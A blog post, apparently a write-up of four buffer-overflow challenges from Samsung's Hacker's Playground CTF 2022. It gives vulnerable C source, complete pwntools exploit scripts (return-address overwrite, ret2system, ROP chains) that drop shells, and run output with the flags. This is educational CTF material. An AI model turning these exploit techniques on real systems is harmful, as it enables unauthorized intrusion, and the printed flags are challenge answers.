---
layout: post
title: Hacker's Playground CTF 2022
author: Kolja
categories: [CTF]
tags: [pwn]
---

This CTF was a side event during the Samsung Security Tech Forum. 

## Tutorial tasks
The following challenges were intended as exercises and gave fewer points than the "real" CTF challenges. 

### BOF101
This was the first warmup challenge. The source code looked as follows:
```
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int printflag(){ 
        char buf[32];
        FILE* fp = fopen("/flag", "r"); 
        fread(buf, 1, 32, fp);
        fclose(fp);
        printf("%s", buf);
        return 0;
}

int main() {
        int check=0xdeadbeef;
        char name[140];
        printf("printflag()'s addr: %p\n", &printflag);
        printf("What is your name?\n: ");
        scanf("%s", name);
        if (check != 0xdeadbeef){
                printf("[Warning!] BOF detected!\n");
                exit(0);
        }
        return 0;
}
```

This was a simple buffer overflow with an address leak. We get the address for a function, that prints the flag. There was a check for the value of a local variable, which meant that we needed to overwrite this variable with the right value. Otherwise, this is a straightforward buffer overflow and could be solved with the following script:

```
#!/usr/bin/env python
# coding: utf-8
import sys
import time
from pwn import *

def main(args):
    p = None

    # toggle to remote with ./pwn.py remote
    if len(args) == 2 and args[1] == "remote":
        p = remote("bof101.sstf.site", 1337)
    else:
        p = process("./bof101")
        #p = gdb.debug("./bof101", gdbscript='break main')
    
    # Receiving until address leak
    print(p.recvuntil(b":"))
    leaked_addr = p.recvline()
    print(leaked_addr)
    leaked_addr = leaked_addr[1:-1]
    print(leaked_addr)
    print_flag = int(leaked_addr, 16)

	# Building our exploit:
    exploit = b"A" * 140 + p32(0xdeadbeef) + b"BBBBBBBB" + p64(print_flag) + b"\n"
    
    # Receive until input prompt
    print(p.recvuntil(b":"))
    print("[+] Sending our exploit")
    p.send(exploit)
    print("[+] Final output")
    # Note that if your program never ends, you will never see any output
    print(p.recvline())
    sys.exit(0)

if __name__ == "__main__":
        main(sys.argv)
```

Running the script against the remote instance gave us the flag:
```
python3 bof101.py remote
[+] Opening connection to bof101.sstf.site on port 1337: Done
[*] '/home/kali/hackersplaygroundctf/bof101'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
b"printflag()'s addr:"
b' 0x555555555229\n'
b'0x555555555229'
b'What is your name?\n:'
[+] Sending our exploit
[+] Final output
b' SCTF{n0w_U_R_B0F_3xpEr7}\n'
[*] Closed connection to bof101.sstf.site port 1337
```

### BOF102
This was the second warmup task. The source code looked as follows:
```
#include <stdio.h>
#include <stdlib.h>

char name[16];

void bofme() {
        char payload[16];
        puts("What's your name?");
        printf("Name > ");
        scanf("%16s", name);
        printf("Hello, %s.\n", name);
        puts("Do you wanna build a snowman?");
        printf(" > ");
        scanf("%s", payload);
        printf("!!!%s!!!\n", payload);
        puts("Good.");
}

int main() {
        system("echo 'Welcome to BOF 102!'");
        bofme();
        return 0;
}
```

This is again a simple buffer overflow, but this time we need to drop a shell. Note that there were almost no protections enabled (except for NX), which allowed us to ignore e.g. ASLR. The following script was used to solve the challenge:

```
#!/usr/bin/env python
# coding: utf-8
import sys
import time
from pwn import *

def main(args):
    p = None

    # toggle to remote with ./pwn.py remote
    if len(args) == 2 and args[1] == "remote":
        p = remote("bof102.sstf.site", 1337)
    else:
        p = process("./bof102")
        #p = gdb.debug("./bof102", gdbscript='break main')

    binary = ELF('./bof102')

    # Choose right path, to get to the vulnerable read call
    print(p.recvuntil(b"Name >"))

    system_arg = 0x804a034
    system_addr = 0x080483e0

    argument = b"/bin/sh\x00\n"

    p.send(argument)

    exploit = b"A" * 16 + b"BBBB"  +  p32(system_addr) + b"AAAA" + p32(system_arg) + b"\n"
    
    #exploit = "A" *200
    print(p.recvuntil(b">"))
    print("[+] Sending our exploit")
    p.send(exploit)
    print("[+] Final output")
    # Note that if your program never ends, you will never see any output
    p.interactive()
    sys.exit(0)

if __name__ == "__main__":
        main(sys.argv)
```

As can be seen, we were able to retrieve the flag using this script:
```
[+] Opening connection to bof102.sstf.site on port 1337: Done
[*] '/home/kali/hackersplaygroundctf/bof102'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
b"Welcome to BOF 102!\nWhat's your name?\nName >"
b' Hello, /bin/sh.\nDo you wanna build a snowman?\n >'
[+] Sending our exploit
[+] Final output
[*] Switching to interactive mode
 $ whoami
/bin/sh: 1: whoami: not found
$ ls
Makefile
bin
bof102
bof102.c
check.py
ex.py
flag
lib
lib64
$ cat flag
SCTF{5t4ck_c4n4ry_4nd_ASLR_4nd_PIE_4re_l3ft_a5_h0m3wOrk}
```

### BOF103
This was the third warmup challenge. The source code was as follows:
```
#include <stdio.h>
#include <stdlib.h>

unsigned long long key;

void useme(unsigned long long a, unsigned long long b)
{
        key = a * b;
}

void bofme() {
        char name[16];

        puts("What's your name?");
        printf("Name > ");
        fflush(stdout);
        scanf("%s", name);
        printf("Bye, %s.\n", name);
}

int main() {
        system("echo 'Welcome to BOF 103!'");
        bofme();
        return 0;
}
   
```

This is again a buffer overflow, but this time we need to use a rop chain to call the `system` function, as this is a 64bit binary instead of a 32bite one. The following script was used to solve this:
```
#!/usr/bin/env python
# coding: utf-8
import sys
import time
from pwn import *


def main(args):
    p = None

    # toggle to remote with ./pwn.py remote
    #if len(args) == 3 and args[2] == "remote":
    p = remote("bof103.sstf.site", 1337)
    #else:
    #p = process("./bof103")
    #   #p = gdb.debug("./bof103", gdbscript='break bofme;set follow-fork-mode parent')

    #binary = ELF('./bof103')

    # Had to set the follow-fork-mode: https://visualgdb.com/gdbreference/commands/set_follow-fork-mode
    # Receiving untile
    print(p.recvuntil(b"> "))
    exploit = b"A"*16 + b"B" * 8
    # Setting up RDI
    exploit += p64(0x4007b3)
    exploit += b"/bin/sh\x00"
    # Setting up RSI
    exploit += p64(0x400747)
    exploit += p64(0x1)
    # Use useme function to set /bin/sh as the value of key
    exploit += p64(0x4006a6)
    # 0x00000000004007b0 : pop r14 ; pop r15 ; ret
    #exploit += p64(0x4007b0) # pop the following two values
    #exploit += p64(0x1337)
    #exploit += p64(0x1337)
    # Put key variable into rdi (pop rdi gadget + address of key variable)
    exploit += p64(0x4007b3)
    exploit += p64(0x601068)
    # Call system
    exploit += p64(0x400550)
    exploit += b"\n"
    print("[+] Sending our exploit")
    p.send(exploit)
    print("[+] Final output")
    # Note that if your program never ends, you will never see any output
    #print(p.recvuntil(b"\n"))
    p.interactive()
    sys.exit(0)

if __name__ == "__main__":
        main(sys.argv)
```

As can be seen in the following output this was successful:
```
[+] Opening connection to bof103.sstf.site on port 1337: Done
b"Welcome to BOF 103!\nWhat's your name?\nName > "
[+] Sending our exploit
[+] Final output
[*] Switching to interactive mode
$ whoami
/bin/sh: 1: whoami: not found
$ ls
bin
bof103
flag
lib
lib64
$ cat flag
SCTF{S0_w3_c4ll_it_ROP_cha1n}
$ 
```


## CTF Tasks
The following were actual challenges during the CTF.

# pppr

This is a buffer overflow in which we reuse a global variable to store our `/bin/sh` string before returning to the `system` function. to drop a shell. We used the following script to solve this challenge:
```
#!/usr/bin/env python
# coding: utf-8
import sys
import time
from pwn import *


def main(args):
    p = None

    # toggle to remote with ./pwn.py remote
    #if len(args) == 3 and args[2] == "remote":
    p = remote("pppr.sstf.site", 1337)
    #else:
    #p = process("./pppr")
    #p = gdb.debug("./pppr", gdbscript='break main')

    #binary = ELF('./bof103')

    # Had to set the follow-fork-mode: https://visualgdb.com/gdbreference/commands/set_follow-fork-mode
    # Receiving until input expected
    #print(p.recvuntil(b"> "))
    exploit = b"A"*8 + b"B" * 4
    # 0x8049fd0 ebx
    # 0x08048488 : sub esp, 0x14 ; push 0x804a008 ; call eax
    # 0x080484d4 : sub esp, 0x10 ; push eax ; push 0x804a008 ; call edx
    # 0x080486b9 : mov dword ptr [0x81fffffd], eax ; ret
    # 0x08048645 : mov eax, dword ptr [esp] ; ret


    # Calling r function again to write our string
    exploit += p32(0x08048526) 
    # 0x080486a8 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret    
    exploit += p32(0x080486a8) # pop 4 times 
    exploit += p32(0x0804a040) # addr of our global buffer
    exploit += p32(0x40) # size
    exploit += p32(0) # stdin
    exploit += p32(0) # garbage value
    # System function
    exploit += p32(0x080485b4)
    exploit += b"AAAA" + p32(0x0804a040)
    exploit += b"\n"
    print("[+] Sending our exploit")
    p.send(exploit)
    p.send(b"/bin/sh\x00\n")
    print("[+] Final output")
    # Note that if your program never ends, you will never see any output
    #print(p.recvuntil(b"\n"))
    p.interactive()
    sys.exit(0)

if __name__ == "__main__":
        main(sys.argv)
```

This was successful as can be seen in the following output:
```
$ python3 pppr.py
[+] Opening connection to pppr.sstf.site on port 1337: Done
[+] Sending our exploit
[+] Final output
[*] Switching to interactive mode
$ cat flag
cat: flag: No such file or directory
$ ls
bin
boot
dev
etc
flag.txt
home
lib
lib32
lib64
libx32
media
mnt
opt
proc
root
run
sbin
srv
start.sh
sys
tmp
usr
var
Alarm clock
$ cat flag.txt
SCTF{Anc13nt_x86_R0P_5kiLl}
$ 
```
